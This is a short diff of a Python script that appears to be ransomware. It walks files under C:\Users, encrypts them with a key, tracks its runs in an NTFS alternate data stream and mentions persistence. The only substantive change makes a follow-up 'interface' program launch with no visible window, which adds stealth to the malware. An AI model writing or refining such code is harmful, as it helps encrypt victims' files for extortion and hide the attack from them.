@@ -156,7 +156,7 @@ def main():
     print(colored(f"[*] Executions -> {executions}", "green"))
     # Persistence creation if executions != 2
     current_dir = os.path.dirname(os.path.abspath(__file__))
-    py_e = os.path.abspath(__file__)
+    py_e = os.path.abspath(__file__)    
     # Search files from a base diretory
     base_directory = r"C:\Users"
     allfiles1.searching_files(base_directory)
@@ -168,7 +168,7 @@ def main():
         key = return_key()
         file_encrypt(files, key)
         time.sleep(5)
-        subprocess.run(["interface"])
+        subprocess.run(["interface"], creationflags=subprocess.CREATE_NO_WINDOW)
         # Set number of executions to not encrypt more times the files
         executions_n = 2
         write_executions_to_ads(path_ads, executions_n)
